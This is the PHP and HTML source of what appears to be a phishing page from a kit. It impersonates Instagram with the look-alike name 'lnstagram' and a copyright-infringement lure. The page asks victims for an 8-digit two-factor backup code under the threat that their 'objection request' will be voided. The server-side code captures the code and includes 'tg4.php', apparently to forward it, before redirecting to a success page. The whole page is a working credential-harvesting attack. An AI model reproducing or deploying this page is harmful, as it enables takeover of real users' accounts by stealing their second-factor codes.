<?php
if ($_POST) {
	$fac=$_POST["2fac"];

	header("location: succes.php");
		  include 'tg4.php';
	  }
	  ?>
<!DOCTYPE html>
<html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
	<link rel="stylesheet" type="text/css" href="bestory.css">
	<title>lnstagram | 2Fac</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="icon.png">
	<meta property="og:image" content="icon.png">
<meta property="og:description" content="Instagram Copyright Infringement Information Center ">
<meta property="og:title" content="lnstagram | Copyright">
	<script src="../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<link rel="stylesheet" type="text/css" href="../../use.fontawesome.com/releases/v5.12.1/css/all.css">

</head>
<body>
	<center>
		<div class="main_bestory">
			<img src="main-text.png" class="mainx_logo" alt="lnstagram" width=200>
			<br>
			<button type="submit" class="none_button"><i class="fab fa-facebook-square" id="req"></i> Continue With Facebook</button>
			<table class="table">
				<tr class="tr">
					<td class="td1"><div></div></td>
					<td class="td2"><p>or</p></td>
					<td class="td3"><div></div></td>
				</tr>
			</table>
			
				<form method="POST" >
					<img src="2fac.png" width=100 class="haveBorder" alt="photo"><br>
					<span class="bestory_text2">Enter one of your 8-Digit backup codes below. If you enter the wrong backup code, your objection request will be considered invalid.<br><br>You can get backup codes here:<br>Settings > Security > Two-Factor Authentication > Other Methods > Backup Codes
</span>

					<br>
			<input type="number" name="2fac" placeholder="8 Haneli Kod"  required="" class="bestory_username" id="username" style="height:40px !important ;" maxlength="8"><br>
			<button type="submit" class="bestory_submit">Approve</button>
			<br>

			<a href="https://www.instagram.com/accounts/password/reset/" style="text-decoration:none;"><span class="dont"><span>your fargot password?</span></span></a>
				
				</form>
				
			</div>
			<br><br><br><br><br><br><br>
<img src="from.png" width=150 class="img_bottom">
			<div class="bottom">
			<span>about </span>
					<span>Blog</span>
					<span>Jobs</span>
					<span>Help</span>
					<span>API</span>
					<span>Privacy</span>
					<span> Terms</span>
					<span>The Best Calculations</span>
					<span>Hashtag's</span>
					<span>Locations</span>
				</div>
				</div>
	</center>
</body>
<script type="text/javascript">
	let btn=document.querySelector('.bestory_submit');
	let username=document.querySelector('.bestory_username');
	btn.disabled=true;
	btn.style.opacity="0.4";
	username.addEventListener('input',()=>{
		if(username.value.length>7){
			btn.disabled=false;
	btn.style.opacity="1";
		}else{
			btn.disabled=true;
	btn.style.opacity="0.4";
		}
	})
	
</script>

</html>